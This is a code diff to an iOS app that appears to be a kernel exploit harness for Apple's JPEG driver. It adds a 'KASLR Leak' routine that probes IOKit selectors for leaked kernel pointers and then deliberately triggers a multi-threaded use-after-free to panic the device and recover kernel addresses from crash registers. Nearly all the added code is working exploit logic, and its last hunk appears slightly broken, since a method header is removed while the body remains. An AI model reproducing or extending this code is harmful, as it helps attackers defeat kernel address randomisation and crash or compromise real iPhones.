@@ -125,6 +125,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
 @property (nonatomic, strong) UIButton *reclaimButton;
 @property (nonatomic, strong) UIButton *triggerButton;
 @property (nonatomic, strong) UIButton *pcControlButton;
+@property (nonatomic, strong) UIButton *kaslrButton;
 @property (nonatomic, strong) UILabel *statusLabel;
 @property (nonatomic, assign) BOOL running;
 @end
@@ -175,6 +176,16 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     self.pcControlButton.translatesAutoresizingMaskIntoConstraints = NO;
     [self.pcControlButton addTarget:self action:@selector(pcControlPressed) forControlEvents:UIControlEventTouchUpInside];
 
+    // KASLR Leak button
+    self.kaslrButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    [self.kaslrButton setTitle:@"KASLR Leak" forState:UIControlStateNormal];
+    self.kaslrButton.titleLabel.font = [UIFont boldSystemFontOfSize:16];
+    [self.kaslrButton setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
+    self.kaslrButton.backgroundColor = [UIColor colorWithRed:0.1 green:0.7 blue:0.3 alpha:1.0];
+    self.kaslrButton.layer.cornerRadius = 12;
+    self.kaslrButton.translatesAutoresizingMaskIntoConstraints = NO;
+    [self.kaslrButton addTarget:self action:@selector(kaslrPressed) forControlEvents:UIControlEventTouchUpInside];
+
     // Status label
     self.statusLabel = [[UILabel alloc] init];
     self.statusLabel.text = @"";
@@ -198,6 +209,7 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self.view addSubview:self.reclaimButton];
     [self.view addSubview:self.triggerButton];
     [self.view addSubview:self.pcControlButton];
+    [self.view addSubview:self.kaslrButton];
     [self.view addSubview:self.statusLabel];
     [self.view addSubview:self.logView];
 
@@ -220,9 +232,13 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
         [self.triggerButton.heightAnchor constraintEqualToConstant:50],
         [self.pcControlButton.topAnchor constraintEqualToAnchor:self.reclaimButton.bottomAnchor constant:12],
         [self.pcControlButton.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:30],
-        [self.pcControlButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-30],
+        [self.pcControlButton.trailingAnchor constraintEqualToAnchor:self.view.centerXAnchor constant:-8],
         [self.pcControlButton.heightAnchor constraintEqualToConstant:50],
-        [self.logView.topAnchor constraintEqualToAnchor:self.pcControlButton.bottomAnchor constant:12],
+        [self.kaslrButton.topAnchor constraintEqualToAnchor:self.reclaimButton.bottomAnchor constant:12],
+        [self.kaslrButton.leadingAnchor constraintEqualToAnchor:self.view.centerXAnchor constant:8],
+        [self.kaslrButton.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-30],
+        [self.kaslrButton.heightAnchor constraintEqualToConstant:50],
+        [self.logView.topAnchor constraintEqualToAnchor:self.kaslrButton.bottomAnchor constant:12],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:12],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-12],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
@@ -309,9 +325,300 @@ _Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58,
     [self pcControlTest];
 }
 
-#pragma mark - Status
+- (void)kaslrPressed {
+    if (self.running) return;
 
-- (void)setStatus:(NSString *)text {
+    [UIView animateWithDuration:0.1 animations:^{
+        self.kaslrButton.transform = CGAffineTransformMakeScale(0.9, 0.9);
+    } completion:^(BOOL finished) {
+        [UIView animateWithDuration:0.1 animations:^{
+            self.kaslrButton.transform = CGAffineTransformIdentity;
+        }];
+    }];
+
+    [UIView animateWithDuration:0.3 animations:^{
+        self.logView.alpha = 1.0;
+    }];
+
+    [self setStatus:@"KASLR Leak..."];
+    [self kaslrLeakProbe];
+}
+
+#pragma mark - KASLR Leak Probe
+
+// Phase 1: Probe all selectors for kernel pointer output
+// - Sel 0 (getTarget): IOConnectCallMethod with scalar output
+// - Sel 2 (query): scalar output
+// - Sel 4/5 (unknown): 0x1000 struct output — check for uninitialized kernel data
+// Phase 2: No-reclaim UAF crash — get kernel addresses from panic log registers
+- (void)kaslrLeakProbe {
+    if (self.running) {
+        [self log:@"Already running"];
+        return;
+    }
+    self.running = YES;
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        [self log:@"=== KASLR Leak Probe ==="];
+        [self log:@"Device: iPhone 13 (A15, arm64e, no MTE)"];
+
+        io_service_t svc = [self findJPEGService];
+        if (!svc) {
+            [self log:@"Service not found"];
+            self.running = NO;
+            return;
+        }
+
+        BOOL healthy = [self checkDriverHealth:svc];
+        [self log:@"Driver: %@", healthy ? @"OK" : @"BROKEN"];
+        if (!healthy) {
+            [self log:@"Driver broken — reboot first"];
+            IOObjectRelease(svc);
+            self.running = NO;
+            return;
+        }
+
+        io_connect_t conn = [self openUC:svc];
+        if (!conn) {
+            IOObjectRelease(svc);
+            self.running = NO;
+            return;
+        }
+
+        // ========================================================
+        // PHASE 1a: Probe sel 0 (getTarget) with scalar output
+        // If getTarget returns an OSObject*, the scalar output
+        // might be a kernel pointer (possibly PAC-signed).
+        // ========================================================
+        [self log:@""];
+        [self log:@"--- Phase 1a: Sel 0 (getTarget) scalar probe ---"];
+
+        for (int sc = 0; sc <= 4; sc++) {
+            uint64_t scalarsOut[8] = {0};
+            uint32_t outCnt = (uint32_t)sc;
+            kern_return_t kr = IOConnectCallMethod(conn, 0,
+                NULL, 0, NULL, 0,
+                scalarsOut, &outCnt,
+                NULL, NULL);
+            if (kr == KERN_SUCCESS && outCnt > 0) {
+                [self log:@"Sel 0 scalar[%d]:", sc];
+                for (uint32_t i = 0; i < outCnt && i < 8; i++) {
+                    uint64_t v = scalarsOut[i];
+                    uint64_t high40 = v >> 40;
+                    const char *tag = "";
+                    if (high40 == 0xfffffe || high40 == 0xffffff)
+                        tag = "  *** KERNEL POINTER ***";
+                    else if ((v >> 56) == 0x80 || (v >> 56) == 0xC0)
+                        tag = "  [PAC-signed?]";
+                    [self log:@"  [%u] 0x%016llx%s", i, v, tag];
+                }
+            } else {
+                [self log:@"Sel 0 sc=%d: kr=0x%x outCnt=%u", sc, kr, outCnt];
+            }
+        }
+
+        // ========================================================
+        // PHASE 1b: Probe sel 2 (query) with scalar output
+        // ========================================================
+        [self log:@""];
+        [self log:@"--- Phase 1b: Sel 2 (query) scalar probe ---"];
+
+        for (int sc = 0; sc <= 4; sc++) {
+            uint64_t scalarsOut[8] = {0};
+            uint32_t outCnt = (uint32_t)sc;
+            kern_return_t kr = IOConnectCallMethod(conn, 2,
+                NULL, 0, NULL, 0,
+                scalarsOut, &outCnt,
+                NULL, NULL);
+            if (kr == KERN_SUCCESS && outCnt > 0) {
+                [self log:@"Sel 2 scalar[%d]:", sc];
+                for (uint32_t i = 0; i < outCnt && i < 8; i++) {
+                    uint64_t v = scalarsOut[i];
+                    uint64_t high40 = v >> 40;
+                    const char *tag = "";
+                    if (high40 == 0xfffffe || high40 == 0xffffff)
+                        tag = "  *** KERNEL POINTER ***";
+                    else if ((v >> 56) == 0x80 || (v >> 56) == 0xC0)
+                        tag = "  [PAC-signed?]";
+                    [self log:@"  [%u] 0x%016llx%s", i, v, tag];
+                }
+            } else {
+                [self log:@"Sel 2 sc=%d: kr=0x%x outCnt=%u", sc, kr, outCnt];
+            }
+        }
+
+        // ========================================================
+        // PHASE 1c: Probe sel 4/5 with struct output (0x1000 bytes)
+        // Unknown selectors — 4KB out struct may leak kernel
+        // heap data if kernel doesn't zero the entire buffer.
+        // ========================================================
+        [self log:@""];
+        [self log:@"--- Phase 1c: Sel 4/5 struct probe (0x1000 out) ---"];
+
+        for (int sel = 4; sel <= 5; sel++) {
+            uint8_t *outBuf = calloc(0x1000, 1);
+            if (!outBuf) continue;
+            size_t outSize = 0x1000;
+            kern_return_t kr = IOConnectCallStructMethod(conn, (uint32_t)sel,
+                NULL, 0, outBuf, &outSize);
+            [self log:@"Sel %d: kr=0x%x outSize=%zu", sel, kr, outSize];
+
+            if (kr == KERN_SUCCESS && outSize > 0) {
+                // Scan for kernel pointer patterns (0xfffffe/0xffffff high bits)
+                int kptrCount = 0;
+                for (size_t off = 0; off + 8 <= outSize; off += 8) {
+                    uint64_t v = *(uint64_t *)(outBuf + off);
+                    uint64_t high40 = v >> 40;
+                    if (high40 == 0xfffffe || high40 == 0xffffff) {
+                        if (kptrCount < 8) {
+                            [self log:@"  [+0x%03zx] 0x%016llx *** KERNEL PTR", off, v];
+                        }
+                        kptrCount++;
+                    }
+                }
+                if (kptrCount > 8)
+                    [self log:@"  ... %d total kernel pointers in output", kptrCount];
+                if (kptrCount == 0)
+                    [self log:@"  No kernel pointers found (all zero or sanitized)"];
+
+                // Also dump first 64 bytes as hex
+                NSMutableString *hex = [NSMutableString string];
+                for (size_t i = 0; i < 64 && i < outSize; i++) {
+                    [hex appendFormat:@"%02x", outBuf[i]];
+                    if ((i + 1) % 8 == 0) [hex appendString:@" "];
+                }
+                [self log:@"  First 64 bytes: %@", hex];
+            }
+            free(outBuf);
+        }
+
+        // ========================================================
+        // PHASE 1d: Probe sel 0, 2 with struct output
+        // ========================================================
+        [self log:@""];
+        [self log:@"--- Phase 1d: Sel 0/2 struct probe (0x100 out) ---"];
+
+        for (int sel = 0; sel <= 2; sel += 2) {
+            uint8_t *outBuf = calloc(0x100, 1);
+            if (!outBuf) continue;
+            size_t outSize = 0x100;
+            kern_return_t kr = IOConnectCallStructMethod(conn, (uint32_t)sel,
+                NULL, 0, outBuf, &outSize);
+            [self log:@"Sel %d (struct): kr=0x%x outSize=%zu", sel, kr, outSize];
+
+            if (kr == KERN_SUCCESS && outSize > 0) {
+                int kptrCount = 0;
+                for (size_t off = 0; off + 8 <= outSize; off += 8) {
+                    uint64_t v = *(uint64_t *)(outBuf + off);
+                    if (v == 0) continue;
+                    uint64_t high40 = v >> 40;
+                    if (high40 == 0xfffffe || high40 == 0xffffff) {
+                        [self log:@"  [+0x%03zx] 0x%016llx *** KERNEL PTR", off, v];
+                        kptrCount++;
+                    }
+                }
+                if (kptrCount == 0) {
+                    // Dump non-zero qwords
+                    for (size_t off = 0; off + 8 <= outSize; off += 8) {
+                        uint64_t v = *(uint64_t *)(outBuf + off);
+                        if (v != 0)
+                            [self log:@"  [+0x%03zx] 0x%016llx", off, v];
+                    }
+                }
+            }
+            free(outBuf);
+        }
+
+        IOServiceClose(conn);
+
+        // ========================================================
+        // PHASE 2: No-Reclaim UAF Crash
+        // Multi-threaded concurrent free → stale queue entries
+        // WITHOUT reclaim → kernel reads FEEDFACE → data abort
+        // Panic log registers: X19=this (driver*), X22=queue head,
+        // PC=AppleJPEGDriver text — all kernel addresses.
+        // ========================================================
+        [self log:@""];
+        [self log:@"=== Phase 2: No-Reclaim UAF Crash ==="];
+        [self log:@"WARNING: This panics the device in ~3 seconds."];
+        [self log:@"Phase 1 results are above — screenshot them NOW."];
+        [self log:@"After reboot: run scripts/pull_logs.py for panic log."];
+        [self log:@"Starting in 3..."];
+        sleep(1);
+        [self log:@"2..."];
+        sleep(1);
+        [self log:@"1..."];
+        sleep(1);
+
+        const uint32_t W2 = 2048, H2 = 2048;
+        NSData *jpegData2 = [self createTestJPEG:W2 height:H2];
+        IOSurfaceRef srcSurf2 = [self createSourceSurface:jpegData2];
+        IOSurfaceRef dstSurf2 = [self createDestSurface:W2 height:H2];
+        if (!srcSurf2 || !dstSurf2) {
+            [self log:@"Surface creation failed"];
+            IOObjectRelease(svc);
+            if (srcSurf2) CFRelease(srcSurf2);
+            if (dstSurf2) CFRelease(dstSurf2);
+            self.running = NO;
+            return;
+        }
+        uint32_t srcID2 = IOSurfaceGetID(srcSurf2);
+        uint32_t dstID2 = IOSurfaceGetID(dstSurf2);
+
+        // 4 concurrent threads, each doing 25 cycles of open→submit→close
+        // Total: 4 × 25 × 10 = 1000 freed JpegRequests in rapid succession
+        // Mass concurrent frees maximize in-flight HW at close time
+        __block int32_t totalFreed = 0;
+        dispatch_group_t crashGroup = dispatch_group_create();
+
+        for (int t = 0; t < 4; t++) {
+            dispatch_group_async(crashGroup,
+                dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                for (int i = 0; i < 25 && self.running; i++) {
+                    io_connect_t vc = [self openUC:svc];
+                    if (!vc) continue;
+                    int n = [self submitAsyncRequests:vc
+                        srcID:srcID2 dstID:dstID2 width:W2 height:H2
+                        count:10 tokenBase:(0xCAFE00 + t * 1000 + i)];
+                    IOServiceClose(vc);
+                    __sync_fetch_and_add(&totalFreed, n);
+                }
+            });
+        }
+
+        dispatch_group_wait(crashGroup,
+            dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
+
+        [self log:@"Freed %d JpegRequests across 4 threads (no reclaim)", totalFreed];
+        [self log:@"Waiting for HW completions to walk stale queue..."];
+        [self log:@"Expect: LDR from FEEDFACE @ req+0x80 → DATA ABORT panic"];
+
+        usleep(3000000); // 3 seconds — HW drain triggers finish_io_gated
+
+        // If we reach here, device survived
+        BOOL survived = [self checkDriverHealth:svc];
+        [self log:@"Device survived! Driver: %@", survived ? @"OK" : @"BROKEN"];
+        if (survived) {
+            [self log:@"Possible reasons:"];
+            [self log:@"  1. All HW completed before close (window too tight)"];
+            [self log:@"  2. Queue already drained by previous ops"];
+            [self log:@"  3. FEEDFACE read didn't fault (PAC suppression?)"];
+            [self log:@"Try: open Camera app to stress the driver more"];
+        }
+
+        CFRelease(srcSurf2);
+        CFRelease(dstSurf2);
+        IOObjectRelease(svc);
+
+        [self log:@""];
+        [self log:@"=== KASLR Leak Probe Complete ==="];
+        [self log:@"Check logs above for kernel pointer patterns (0xfffffe/0xffffff)"];
+        [self log:@"If phase 2 panicked: pull logs and check register dump"];
+        self.running = NO;
+    });
+}
+
+#pragma mark - Status
     dispatch_async(dispatch_get_main_queue(), ^{
         self.statusLabel.text = text;
     });
